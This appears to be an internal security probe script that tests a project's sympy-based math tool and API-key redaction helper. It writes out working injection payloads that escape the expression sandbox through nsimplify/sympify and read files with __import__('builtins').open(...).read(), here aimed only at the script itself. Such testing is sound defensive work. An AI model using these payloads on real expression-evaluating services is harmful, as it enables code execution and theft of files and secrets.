"""Second round: pin down redaction gaps, the nsimplify bypass mechanism,
and the file-read primitive. Read-only. Run from outside the repo:
    .venv/Scripts/python.exe -I docs/exploration/full-sweep-16/_probe_a2.py
"""
from __future__ import annotations

import os
import sys
import types

REPO = os.path.dirname(
    os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
)
TOOLS = os.path.join(REPO, "src", "backend", "tools")
sys.path.insert(0, REPO)
_pkg = types.ModuleType("ptools")
_pkg.__path__ = [TOOLS]
sys.modules["ptools"] = _pkg

import importlib

import sympy
from sympy.parsing.sympy_parser import parse_expr

amap = importlib.import_module("ptools._amap")

print("===== Q1 safe_amap_error redaction edges =====")
for s in [
    "key=ABC123",
    " key=ABC123",
    "?key=ABC123",
    "&key=ABC123",
    "url?key=ABC123",
    "URL?key=ABC123",
    "key = ABC123",
    "security_code=ABC123",
    "secu rity_code=ABC123",
    "{'key':'ABC123'}",
    "key=ABC123&key2=ZZZ",
    "api_key=ABC123",
    "AMAP_WEB_SERVICE_KEY=ABC123",
    "http://x?key=ABC123&jscode=QQR",
]:
    print(f"   {s!r:38s} -> {amap.safe_amap_error(s)!r}")

print("\n===== Q2 float() on huge digit strings (no exception?) =====")
for label, val in [("1e400", "1e400"), ("9"*400, "9" * 400), ("9"*10000, "9" * 10000),
                   ("int 9*10**399", None)]:
    if val is None:
        try:
            float(9 * 10 ** 399)
            print("   int->float: no error")
        except Exception as exc:  # noqa: BLE001
            print(f"   int->float RAISED {type(exc).__name__}: {exc}")
    else:
        try:
            r = float(val)
            print(f"   {label[:14]:16s} -> {r!r}  (isfinite={__import__('math').isfinite(r)})")
        except Exception as exc:  # noqa: BLE001
            print(f"   {label[:14]:16s} RAISED {type(exc).__name__}: {exc}")
print("   _optional_float on int inputs:")
for v in [9 * 10 ** 399, 10 ** 400, 1e308, float("nan")]:
    try:
        print(f"      {str(v)[:16]:18s} -> {amap._optional_float(v)!r}")
    except Exception as exc:  # noqa: BLE001
        print(f"      {str(v)[:16]:18s} RAISED {type(exc).__name__}: {exc}")

print("\n===== Q3 does the INNER sympify run inside the sandbox? =====")
ns = {}
exec("from sympy import *", ns)
ns["__builtins__"] = {}
SQ, DQ = chr(39), chr(34)
P = "__import__(" + SQ + "os" + SQ + ").getppid()"
print("real parent pid =", os.getppid())
print("-- nsimplify inner call, step by step --")
for step, code in [
    ("sympify(P)", f"sympify({DQ + P + DQ})"),
    ("sympify('1/2')", f"sympify({DQ}1/2{DQ})"),
    ("nsimplify('1/2')", f"nsimplify({DQ}1/2{DQ})"),
    ("nsimplify(P)", f"nsimplify({DQ + P + DQ})"),
]:
    try:
        r = parse_expr(code, global_dict=ns, evaluate=True)
        print(f"   {step:18s} -> {r.__class__.__name__} = {str(r)[:44]}")
    except Exception as exc:  # noqa: BLE001
        print(f"   {step:18s} RAISED {type(exc).__name__}: {str(exc)[:110]}")

print("-- plain (unsandboxed) sympify for reference --")
for code in [f"sympify({DQ + P + DQ})", f"nsimplify({DQ + P + DQ})", f"nsimplify({DQ}1/2{DQ})"]:
    try:
        r = parse_expr(code, evaluate=True)
        print(f"   {code[:40]:42s} -> {r.__class__.__name__} = {str(r)[:40]}")
    except Exception as exc:  # noqa: BLE001
        print(f"   {code[:40]:42s} RAISED {type(exc).__name__}: {str(exc)[:90]}")

print("\n===== Q4 can the tool read an arbitrary file (read-only proof)? =====")
self_path = os.path.abspath(__file__)
self_len = os.path.getsize(self_path)
print("probe file:", self_path)
print("real size :", self_len)
open_expr = "__import__(" + SQ + "builtins" + SQ + ").open(" + DQ + self_path + DQ + ").read()"
for expr, label in [
    (open_expr, "open(path).read() raw"),
    ("len(" + open_expr + ")", "len(open(path).read())  <- length leaks as a number"),
    ("len(" + open_expr + ") + len(" + open_expr + ")", "sum of two lengths"),
]:
    try:
        r = parse_expr(expr, evaluate=True)
        print(f"   {label:46s} -> {r.__class__.__name__} = {str(r)[:40]}")
    except Exception as exc:  # noqa: BLE001
        print(f"   {label:46s} RAISED {type(exc).__name__}: {str(exc)[:80]}")

print("\n===== Q5 same via the tool wrapper (does the tool hide it?) =====")
mt = importlib.import_module("ptools.math_tool")
for expr in [f"len({open_expr})", f"len({open_expr}) + len({open_expr})"]:
    try:
        print(f"   {expr[:40]:42s} -> {mt.solve_math(operation='evaluate', expression=expr)[:110]!r}")
    except Exception as exc:  # noqa: BLE001
        print(f"   {expr[:40]:42s} UNCAUGHT {type(exc).__name__}")

print("\n===== Q6 sympy version + nsimplify source line =====")
print("sympy:", sympy.__version__)
import inspect

src = inspect.getsource(sympy.nsimplify)
for i, line in enumerate(src.splitlines()[:12], 1):
    print(f"   {i:3d}: {line}")
print("    ...")
for i, line in enumerate(src.splitlines(), 1):
    if "sympify" in line and i > 8:
        print(f"   {i:3d}: {line}")
        break

print("\nDONE")
